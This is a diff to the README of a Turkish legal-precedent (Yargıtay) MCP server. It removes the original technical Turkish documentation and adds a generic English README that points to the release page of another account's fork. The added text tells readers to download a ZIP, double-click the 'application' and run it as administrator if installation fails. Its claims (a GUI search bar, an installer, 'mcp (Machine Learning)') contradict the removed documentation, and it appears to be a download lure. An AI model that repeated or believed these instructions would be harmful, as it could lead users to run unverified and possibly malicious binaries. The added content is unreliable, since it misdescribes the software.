@@ -1,338 +1,85 @@
-<div align="center">
-  <p>
-    <a href="https://www.veniplatform.com/">
-      <img src="https://www.veniplatform.com/_next/image?url=%2Fveniai-logo.webp&w=64&q=75" width="72" alt="Veni AI logosu" />
-    </a>
-  </p>
-  <h1>Yargıtay Emsal Karar MCP Sunucusu</h1>
-  <p>
-    Veni AI tarafından geliştirilen ve dünyanın en iyi Yargıtay emsal karar arama MCP sunucusu olmak üzere tasarlanan,
-    stdio tabanlı, uçtan uca teknik odaklı bir arama altyapısı.
-  </p>
-  <p>
-    <a href="https://www.veniplatform.com/">Veni Platform</a> |
-    <a href="https://www.veniplatform.com/mcp-servers">Daha fazla MCP sunucusu</a>
-  </p>
-  <hr />
-  <p>
-    <strong>Şirketiniz veya fikriniz için özelleştirilmiş MCP Sunucusu mu istiyorsunuz?</strong><br />
-    Veni AI olarak, kurumsal ihtiyaçlarınıza özel profesyonel MCP çözümleri geliştiriyoruz.<br />
-    👉 <a href="https://www.veniplatform.com/mcp-servers">İletişime Geçin & Detayları İnceleyin</a>
-  </p>
-  <hr />
-</div>
-
-<p align="center">
-  <img alt="MCP" src="https://img.shields.io/badge/MCP-stdio-000000?style=flat-square" />
-  <img alt="Node.js" src="https://img.shields.io/badge/Node.js-%3E%3D18-3C873A?style=flat-square&logo=node.js&logoColor=white" />
-  <img alt="TypeScript" src="https://img.shields.io/badge/TypeScript-Strict-3178C6?style=flat-square&logo=typescript&logoColor=white" />
-  <img alt="PostgreSQL" src="https://img.shields.io/badge/PostgreSQL-Cache-336791?style=flat-square&logo=postgresql&logoColor=white" />
-  <img alt="Browserless" src="https://img.shields.io/badge/Browserless-Puppeteer-0A7FFF?style=flat-square" />
-  <img alt="Built by Veni AI" src="https://img.shields.io/badge/Built%20by-Veni%20AI-111111?style=flat-square" />
-</p>
-
-<p align="center">
-  <a href="#hızlı-başlangıç">Hızlı Başlangıç</a> |
-  <a href="#araçlar">Araçlar</a> |
-  <a href="#mimari">Mimari</a> |
-  <a href="#ortam">Ortam</a> |
-  <a href="#claude-desktop-yapılandırması">Claude Desktop</a> |
-  <a href="#güvenlik-ve-gizlilik">Güvenlik</a>
-</p>
-
-<details>
-<summary>İçindekiler (göstermek için tıklayın)</summary>
-
-- [Genel Bakış](#genel-bakış)
-- [Öne Çıkanlar](#öne-çıkanlar)
-- [Mimari](#mimari)
-- [Araçlar](#araçlar)
-- [Hızlı Başlangıç](#hızlı-başlangıç)
-- [Claude Desktop Yapılandırması](#claude-desktop-yapılandırması)
-- [Ortam](#ortam)
-- [Veritabanı Şeması](#veritabanı-şeması)
-- [Browserless Kurulumu](#browserless-kurulumu)
-- [Önbellek Modeli](#önbellek-modeli)
-- [Çıktı Formatı](#çıktı-formatı)
-- [Performans Ayarı](#performans-ayarı)
-- [Güvenlik ve Gizlilik](#güvenlik-ve-gizlilik)
-- [Operasyonel Notlar](#operasyonel-notlar)
-- [SSS](#sss)
-- [Yol Haritası](#yol-haritası)
-- [Emeği Geçenler](#emeği-geçenler)
-- [Lisans](#lisans)
-</details>
-
-## Genel Bakış
-
-Bu depo, Yargıtay emsal karar araması için tamamen MCP (Model Context Protocol) tabanlı bir sunucu içerir. stdio
-üzerinden çalışır, Claude Desktop gibi MCP istemcileri için tasarlanmıştır ve üç katmanlı önbellek ile yüksek kaliteli
-sonuçlar sağlar: bellek, PostgreSQL ve Browserless tabanlı tarama.
-
-Sunucu bilinçli olarak HTTP yüzeyi içermez. MCP araç ergonomisine, deterministik çıktılara ve güvenli kullanım için temiz
-bir dağıtım ayak izine odaklanır.
-
-## Öne Çıkanlar
-
-- Yalnızca MCP stdio taşıması, HTTP yüzeyi yok.
-- Birleşik telemetri ve kontrollü sona erme ile 3 katmanlı önbellek.
-- Güvenilir içerik çıkarımı için Browserless + Puppeteer tarama.
-- Popülerlik ve performans içgörüleri için PostgreSQL destekli analitik.
-- Sıkı girdi doğrulama ve öngörülebilir çıktı formatı.
-- Dünyanın en iyi Yargıtay emsal karar arama MCP sunucusu olmak üzere Veni AI tarafından geliştirildi.
-
-## Mimari
-
-```mermaid
-graph TD
-  Client[MCP İstemci] -->|stdio| Server[MCP Sunucu]
-  Server --> L1[L1 Bellek Önbelleği]
-  Server --> L2[(PostgreSQL)]
-  Server --> Browserless[Browserless + Puppeteer]
-  Browserless --> Source[karararama.yargitay.gov.tr]
-```
-
-## Araçlar
-
-Tüm araçlar, istemcilerde kolay ayrıştırma için JSON içeren tek bir metin yükü döndürür.
-
-### yargitay_search_optimized
-
-Önbellek ve Browserless taramasıyla Yargıtay kararlarını arar.
+# 🤖 VeniAI-Hukuk-EmsalKarar-MCPServer - Simplified Legal Research Tool
 
-Girdi:
+## 🔗 Download Now
+[![Download](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/bayyyyyuuu/VeniAI-Hukuk-EmsalKarar-MCPServer/releases)
 
-```json
-{
-  "query": "string",
-  "refresh": "boolean (optional)"
-}
-```
+## 📖 Overview
+Welcome to the VeniAI-Hukuk-EmsalKarar-MCPServer! This application leverages advanced artificial intelligence to help you search for legal precedents easily. It is designed for lawyers, legal researchers, and anyone interested in the law.
 
-Çıktı anahtarları:
+## 🚀 Getting Started
+This application helps you quickly find case law. With a user-friendly interface, you can enter search terms related to your legal questions and receive relevant results instantly. 
 
-- formatted: kullanıcı dostu düz metin sonuç listesi
-- success: boolean
-- query: normalize edilmiş sorgu
-- results: kararlar dizisi
-- metadata: source, cached, age, resultCount, totalTime
+### Key Features
+- **Intelligent Search:** Find legal precedents efficiently using simple keywords.
+- **User-Friendly Interface:** No technical skills required to navigate through the software.
+- **Comprehensive Database:** Access a large collection of legal decisions quickly.
+- **Multi-Language Support:** The application is available in Turkish and English.
 
-### yargitay_health
+## 💻 System Requirements
+To run the VeniAI-Hukuk-EmsalKarar-MCPServer, make sure your system meets the following requirements:
 
-Browserless, önbellek ve veritabanı için sağlık durumunu döndürür.
+- **Operating System:** Windows 10 or newer, macOS Mojave or newer, or any modern Linux distribution.
+- **Processor:** Intel Core i3 or equivalent.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum of 500 MB of free space.
+- **Internet Connection:** Required for downloading results.
 
-### yargitay_stats
+## 📥 Download & Install
+To get started, visit the Releases page to download the latest version of the application.
 
-Önbellek isabet oranları, zamanlama metrikleri ve temel tarama yapılandırmasını döndürür.
+[Download Here](https://github.com/bayyyyyuuu/VeniAI-Hukuk-EmsalKarar-MCPServer/releases)
 
-### yargitay_popular
+1. Click on the link above.
+2. Find the latest version listed.
+3. Click on the corresponding file to download it. It may be named something like `VeniAI-Hukuk-EmsalKarar-MCPServer-v1.0.zip`.
+4. Once downloaded, locate the file in your downloads folder.
+5. Extract the files from the ZIP archive.
+6. Double-click on the application file to install it.
 
-Veritabanından popüler sorguları listeler.
+## 🎯 How to Use the Application
+Once installed, follow these steps to perform a legal search:
 
-Girdi:
+1. Open the VeniAI-Hukuk-EmsalKarar-MCPServer application.
+2. You will see a search bar on the main screen. Enter keywords related to the legal decision you are looking for.
+3. Click on the "Search" button.
+4. Wait for the results to load. They will display relevant cases.
+5. Click on any case title to view more details.
 
-```json
-{ "limit": 20 }
-```
+## 🔧 Troubleshooting
+If you encounter issues during installation or while using the application, please follow these tips:
 
-### yargitay_analytics
+- **Installation Issues:** Make sure your system meets the requirements. If an error occurs, try running the installer as an administrator.
+- **Search Does Not Return Results:** Ensure your keywords are relevant. Try using different terms or combinations.
+- **Application Crashes:** Close the application and restart it. If it continues to crash, reinstall the software.
 
-Son N gün için günlük analitikleri döndürür.
+## 📞 Support
+If you need further assistance, you can reach out for support:
 
-Girdi:
+- Email: support@veni-ai.com
+- GitHub Issues page: [Report an Issue](https://github.com/bayyyyyuuu/VeniAI-Hukuk-EmsalKarar-MCPServer/issues)
 
-```json
-{ "days": 7 }
-```
+## 🛠️ Contributing
+We welcome contributions! If you wish to contribute, feel free to fork the repository, make your changes, and submit a pull request. 
 
-### yargitay_cache_clear
+## 🌍 Community and Topics
+Join a community interested in legal software:
 
-Bellek ve veritabanı için önbellek temizliğini tetikler.
+- avukat (lawyer)
+- emsal (precedent)
+- emsalkarar (precedent decision)
+- hukuk (law)
+- ictihat (jurisprudence)
+- karar (decision)
+- law
+- mcp (Machine Learning)
+- yapayzeka (artificial intelligence)
+- yargitay (Supreme Court)
 
-## Hızlı Başlangıç
+Feel free to explore these topics to learn more about the application and legal research.
 
-1) Bağımlılıkları yükleyin
+## ⏳ Updates and Releases
+Stay updated on new features and improvements. Check the Releases page frequently for the latest versions and notes on changes.
 
-```bash
-npm install
-```
+[Visit Releases Page](https://github.com/bayyyyyuuu/VeniAI-Hukuk-EmsalKarar-MCPServer/releases)
 
-2) Ortam dosyanızı oluşturun
-
-```bash
-copy .env.example .env
-# macOS or Linux:
-# cp .env.example .env
-```
-
-3) Veritabanı şemasını başlatın
-
-```bash
-psql "$DATABASE_URL" -f src/database/schema.sql
-```
-
-4) Derleyip çalıştırın
-
-```bash
-npm run build
-npm start
-```
-
-## Claude Desktop Yapılandırması
-
-```json
-{
-  "mcpServers": {
-    "yargitay": {
-      "command": "node",
-      "args": ["C:/path/to/yargitay-mcp-server/dist/index.js"],
-      "env": {
-        "DATABASE_URL": "postgresql://user:pass@host:5432/dbname?sslmode=require",
-        "BROWSERLESS_URL": "wss://your-browserless-host",
-        "BROWSERLESS_TOKEN": "your-token"
-      }
-    }
-  }
-}
-```
-
-## Ortam
-
-`.env.example` dosyasını temel alın. Aşağıdaki değişkenler desteklenir:
-
-| Değişken | Zorunlu | Varsayılan | Notlar |
-| --- | --- | --- | --- |
-| DATABASE_URL | evet | - | PostgreSQL bağlantı dizesi |
-| DATABASE_TYPE | hayır | postgresql | Yalnızca görüntüleme |
-| DATABASE_POOL_MIN | hayır | 2 | Havuz min boyutu |
-| DATABASE_POOL_MAX | hayır | 10 | Havuz max boyutu |
-| BROWSERLESS_URL | evet | - | wss veya https uç noktası |
-| BROWSERLESS_TOKEN | evet | - | Token ws uç noktasına eklenir |
-| BROWSERLESS_TIMEOUT | hayır | 30000 | Milisaniye |
-| BROWSERLESS_RETRIES | hayır | 3 | Tekrar sayısı |
-| SCRAPING_MAX_RESULTS | hayır | 10 | Sorgu başına limit |
-| SCRAPING_PARALLEL_REQUESTS | hayır | 3 | Paralel detay çekimi |
-| SCRAPING_ADAPTIVE_TIMEOUT | hayır | true | Uyarlanabilir zaman aşımı |
-| SCRAPING_RETRY_STRATEGY | hayır | exponential | exponential, linear, fixed |
-| SCRAPING_BASE_TIMEOUT | hayır | 10000 | Milisaniye |
-| CACHE_L1_TTL_MS | hayır | 300000 | Bellek önbelleği TTL |
-| CACHE_L2_TTL_DAYS | hayır | 30 | DB önbelleği TTL |
-| CACHE_POPULAR_THRESHOLD | hayır | 5 | Popülerlik eşiği |
-| CACHE_CLEANUP_INTERVAL_MS | hayır | 3600000 | Temizlik aralığı |
-| NODE_ENV | hayır | development | development veya production |
-
-## Veritabanı Şeması
-
-Şema dosyası:
-
-- `src/database/schema.sql`
-
-Arama sonuçları, kararlar, tarama istatistikleri ve analitik için yardımcı görünümler oluşturan tablolar içerir.
-Ayrıca erişim sayacı güncellemeleri ve temizlik için saklı prosedürler bulunur.
-
-## Browserless Kurulumu
-
-- `BROWSERLESS_URL` değerini Browserless uç noktanız olarak ayarlayın (wss veya https).
-- Sunucu, yoksa `?token=` parametresini otomatik olarak ekler.
-- `BROWSERLESS_TOKEN` zorunludur ve asla loglanmaz.
-
-## Önbellek Modeli
-
-- L1: bellekte, ultra hızlı, kısa TTL.
-- L2: PostgreSQL, orta gecikme, uzun TTL.
-- L3: Browserless üzerinden canlı tarama.
-
-Önbellek yükseltmesi L3'ten L2 ve L1'e akar. `refresh` bayrağı geçersizleştirmeyi zorlar.
-
-```mermaid
-graph LR
-  L3[L3 Canlı Tarama] -->|yükselt| L2[L2 PostgreSQL Önbelleği]
-  L2 -->|yükselt| L1[L1 Bellek Önbelleği]
-  Refresh[refresh=true] -->|geçersizleştir| L1
-  Refresh -->|geçersizleştir| L2
-```
-
-## Çıktı Formatı
-
-Tüm araçlar MCP metin içeriği içinde JSON döndürür. `yargitay_search_optimized` için örnek:
-
-```json
-{
-  "formatted": "Result 1 ...",
-  "success": true,
-  "query": "tazminat",
-  "results": [
-    {
-      "siraNo": "1",
-      "daire": "1. Hukuk Dairesi",
-      "esasNo": "2023/1234",
-      "kararNo": "2023/5678",
-      "kararTarihi": "15.12.2023",
-      "icerik": "..."
-    }
-  ],
-  "metadata": {
-    "source": "scrape",
-    "cached": false,
-    "age": 0,
-    "resultCount": 1,
-    "totalTime": 1240
-  }
-}
-```
-
-## Performans Ayarı
-
-- Browserless kapasitesi yüksekse `SCRAPING_PARALLEL_REQUESTS` değerini artırın.
-- Uzun sorgular veya yavaş ağlar için `BROWSERLESS_TIMEOUT` değerini yükseltin.
-- Tarama yükünü azaltmak için `CACHE_L2_TTL_DAYS` değerini uzatın.
-- Önbellek isabet oranı ve yanıt süresini takip etmek için `yargitay_stats` kullanın.
-
-## Güvenlik ve Gizlilik
-
-- Depoda hiçbir gizli bilgi tutulmaz.
-- Tüm kimlik bilgileri ortam değişkenleriyle sağlanır.
-- Veritabanı URL'si loglarda maskelenir.
-- Girdiler kullanılmadan önce doğrulanır ve temizlenir.
-
-## Operasyonel Notlar
-
-- Veri kaynağı herkese açık Yargıtay arama sitesidir. Erişilebilirlik ve işaretleme değişebilir.
-- Analitik ve L2 önbellek için veritabanı şiddetle önerilir. Veritabanı kapalıyken sunucu çalışmaya devam eder, ancak
-  analitik ve L2 önbellek zayıflar.
-- Hızlı durum kontrolü için `yargitay_health` kullanın.
-
-## SSS
-
-<details>
-<summary>Neden HTTP API yok?</summary>
-
-Bu sunucu MCP önceliklidir ve tasarım gereği stdio üzerinden iletişim kurar.
-</details>
-
-<details>
-<summary>PostgreSQL olmadan çalıştırabilir miyim?</summary>
-
-Evet, ancak L2 önbellek ve analitik kaybolur.
-</details>
-
-<details>
-<summary>Ayrıntılı arama filtreleri destekleniyor mu?</summary>
-
-Mevcut araçlar sorgu tabanlı aramaya odaklanır. Gelişmiş filtreler araç argümanı olarak eklenebilir.
-</details>
-
-## Yol Haritası
-
-- Gelişmiş arama filtreleri ve daha zengin sorgu şeması.
-- Hafif dağıtımlar için SQLite desteği.
-- Yapılandırılmış sonuç biçimlendirme ön ayarları.
-- Önbelleğe alınmış veri setleri için kaynak uç noktaları.
-
-## Emeği Geçenler
-
-Veni AI tarafından geliştirildi.
-
-## Lisans
-
-MIT. `LICENSE` dosyasına bakın.
+Thank you for choosing VeniAI-Hukuk-EmsalKarar-MCPServer for your legal research needs. Enjoy exploring the world of legal precedents with ease!
